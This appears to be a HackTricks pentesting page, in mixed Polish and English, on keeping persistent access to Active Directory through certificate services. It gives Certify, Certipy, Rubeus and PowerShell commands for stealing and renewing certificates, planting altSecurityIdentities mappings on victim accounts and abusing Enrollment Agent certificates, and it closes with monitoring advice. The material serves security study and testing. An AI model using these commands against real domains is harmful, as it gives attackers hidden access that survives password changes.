# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**To krótkie podsumowanie rozdziałów dotyczących account persistence z doskonałych badań z [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Understanding Active User Credential Theft with Certificates – PERSIST1

W scenariuszu, w którym użytkownik może zażądać certyfikatu umożliwiającego uwierzytelnianie domenowe, atakujący ma możliwość zażądać i ukraść ten certyfikat, aby utrzymać dostęp w sieci. Domyślnie szablon `User` w Active Directory pozwala na takie żądania, choć czasami może być wyłączony.

Korzystając z [Certify](https://github.com/GhostPack/Certify) lub [Certipy](https://github.com/ly4k/Certipy), możesz wyszukać włączone szablony, które pozwalają na uwierzytelnianie klienta, a następnie zażądać jednego:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Siła certyfikatu polega na jego zdolności do uwierzytelniania się jako użytkownik, do którego należy, niezależnie od zmian hasła, tak długo jak certyfikat pozostaje ważny.

Możesz przekonwertować PEM na PFX i użyć go, aby uzyskać TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Uwaga: W połączeniu z innymi technikami (zob. sekcje THEFT), uwierzytelnianie oparte na certyfikatach pozwala na trwały dostęp bez ingerencji w LSASS, nawet z nieuprzywilejowanych kontekstów.

## Uzyskiwanie trwałości maszyny za pomocą certyfikatów - PERSIST2

Jeśli atakujący ma podwyższone uprawnienia na hoście, może zarejestrować konto maszynowe skompromitowanego systemu, aby uzyskać certyfikat, używając domyślnego szablonu `Machine`. Uwierzytelnianie jako maszyna włącza S4U2Self dla usług lokalnych i może zapewnić trwałe utrzymanie dostępu do hosta:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Extending Persistence Through Certificate Renewal - PERSIST3

Nadużywanie okresów ważności i odnowienia szablonów certyfikatów pozwala atakującemu utrzymać dostęp długoterminowy. Jeśli posiadasz wcześniej wydany certyfikat i jego klucz prywatny, możesz go odnowić przed wygaśnięciem, aby uzyskać nowe, długotrwałe poświadczenie bez pozostawiania dodatkowych artefaktów żądania powiązanych z oryginalnym podmiotem.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Wskazówka operacyjna: Śledź okresy ważności plików PFX będących w posiadaniu atakującego i odnawiaj je wcześniej. Odnowienie może także spowodować, że zaktualizowane certyfikaty będą zawierać nowoczesne rozszerzenie mapowania SID, dzięki czemu pozostaną użyteczne przy surowszych zasadach mapowania DC (zob. następną sekcję).

## Tworzenie jawnych mapowań certyfikatów (altSecurityIdentities) – PERSIST4

Jeśli możesz zapisywać w atrybucie `altSecurityIdentities` docelowego konta, możesz jawnie przypisać do tego konta certyfikat kontrolowany przez atakującego. To przetrwa zmiany haseł i, przy użyciu silnych formatów mapowania, pozostanie funkcjonalne przy nowoczesnym egzekwowaniu przez DC.

Ogólny przebieg:

1. Uzyskaj lub wydaj certyfikat client-auth, którym zarządzasz (np. zarejestruj szablon `User` jako siebie).
2. Wyodrębnij silny identyfikator z certyfikatu (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Dodaj jawne mapowanie w `altSecurityIdentities` konta ofiary, używając tego identyfikatora.
4. Uwierzytelnij się za pomocą swojego certyfikatu; DC przypisze go do ofiary przez jawne mapowanie.

Przykład (PowerShell) używający silnego mapowania Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Następnie uwierzytelnij się za pomocą swojego PFX. Certipy bezpośrednio uzyska TGT:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Budowanie silnych mapowań `altSecurityIdentities`

W praktyce mapowania **Issuer+Serial** i **SKI** są najłatwiejszymi silnymi formatami do zbudowania na podstawie certyfikatu znajdującego się w posiadaniu atakującego. Ma to znaczenie po **11 lutego 2025**, kiedy DCs domyślnie przejdą na **Full Enforcement**, a słabe mapowania przestaną być niezawodne.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Uwagi
- Use strong mapping types only: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Weak formats (Subject/Issuer, Subject-only, RFC822 email) are deprecated and can be blocked by DC policy.
- The mapping works on both **user** and **computer** objects, so write access to a computer account's `altSecurityIdentities` is enough to persist as that machine.
- The cert chain must build to a root trusted by the DC. Enterprise CAs in NTAuth are typically trusted; some environments also trust public CAs.
- Schannel authentication remains useful for persistence even when PKINIT fails because the DC lacks the Smart Card Logon EKU or returns `KDC_ERR_PADATA_TYPE_NOSUPP`.

Więcej na temat słabych jawnych mapowań i ścieżek ataku znajdziesz w:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

Jeśli uzyskasz ważny Certificate Request Agent/Enrollment Agent certificate, możesz dowolnie wystawiać nowe certyfikaty zdolne do logowania w imieniu użytkowników i przechowywać agent PFX offline jako persistence token. Przebieg nadużycia:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Unieważnienie certyfikatu agenta lub uprawnień do szablonu jest wymagane, aby usunąć tę metodę utrzymania dostępu.

Operational notes
- Modern `Certipy` versions support both `-on-behalf-of` and `-renew`, so an attacker holding an Enrollment Agent PFX can mint and later renew leaf certificates without re-touching the original target account.
- If PKINIT-based TGT retrieval is not possible, the resulting on-behalf-of certificate is still usable for Schannel authentication with `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

Microsoft KB5014754 introduced Strong Certificate Mapping Enforcement on domain controllers. Since February 11, 2025, DCs default to Full Enforcement, rejecting weak/ambiguous mappings. Practical implications:

- Pre-2022 certificates that lack the SID mapping extension may fail implicit mapping when DCs are in Full Enforcement. Attackers can maintain access by either renewing certificates through AD CS (to obtain the SID extension) or by planting a strong explicit mapping in `altSecurityIdentities` (PERSIST4).
- Explicit mappings using strong formats (Issuer+Serial, SKI, SHA1-PublicKey) continue to work. Weak formats (Issuer/Subject, Subject-only, RFC822) can be blocked and should be avoided for persistence.

Administrators should monitor and alert on:
- Changes to `altSecurityIdentities` and issuance/renewals of Enrollment Agent and User certificates.
- CA issuance logs for on-behalf-of requests and unusual renewal patterns.

## References

- Microsoft. KB5014754: Zmiany w uwierzytelnianiu opartym na certyfikatach na kontrolerach domeny Windows (harmonogram egzekwowania i silne mapowania).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
